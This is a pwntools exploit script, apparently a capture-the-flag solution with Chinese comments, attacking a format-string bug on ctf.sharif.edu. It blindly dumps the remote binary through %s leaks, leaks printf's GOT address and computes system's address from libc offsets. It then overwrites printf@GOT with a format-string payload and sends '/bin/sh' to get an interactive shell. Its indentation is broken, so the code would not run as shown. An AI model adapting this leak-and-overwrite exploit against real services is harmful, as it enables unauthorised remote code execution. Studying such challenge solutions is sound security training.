#coding=utf8
from pwn import *
def leakELF(addr):
    p = None
  for i in range(5): #多循环几次，放置连接中断
      try:
        p = remote("ctf.sharif.edu", 54518, timeout=1)
      payload = "ABCD%7$sDCBA" + p32(addr)
      if ("x0a" in payload) or ("x00" in payload):
          log.warning("newline in payload!")
        return "xff"
      p.sendline(payload)
      print p.recvline()
      data2 = p.recvline()
      log.info(hexdump(data2))
      if data2:
          fr = data2.find("ABCD") + 4
        to = data2.find("DCBA")
        res = data2[fr:to]  #定位出泄漏的数据位置
        if res == "":    #说明要泄漏的数据就是x00
            return "x00"
        else:
          return res
      return "xff"  #如果出现异常，先返回xff
    except KeyboardInterrupt:
      raise
    except EOFError:
      log.debug("got EOF for leaking addr 0x{:x}".format(addr))
      pass
    except Exception:
      log.warning("got exception...", exc_info = sys.exc_info())
    finally:
        if p:
          p.close()
    return "xff"
f = open("nomoreblind-binary", "wb")
base = 0x08048000
leaked = ""
while len(leaked) < 8000:          #假设目标ELF小于8kb
    address = base + len(leaked)  #新的泄露地址等于基地址加上已泄漏的长度
  tmp = leakELF(address)
  leaked += tmp
  log.info(hexdump(leaked))
  with open("nomoreblind-binary", "wb") as f: #将已泄漏的数据写入文件
      f.write(leaked)
      

import binascii
p = remote("ctf.sharif.edu", 54518, timeout=1)
printfGOT = 0x0804995c
printfOffset = 0x4cc70
systemOffset = 0x3e3e0
p.sendline("%5$s" + p32(printfGOT))
print p.recvline()
data = p.recv()
printfAddress = data[0:4][::-1]
printfAddress = int(binascii.hexlify(printfAddress),16)
systemAddress = printfAddress - printfOffset + systemOffset
print "printf:", hex(printfAddress)
print "system:", hex(systemAddress)
payload = fmtstr_payload(4, {printfGOT: systemAddress})
p.sendline(payload)
print p.recvline()
print p.recv()
p.sendline("/bin/sh")
print p.recvline()
p.interactive()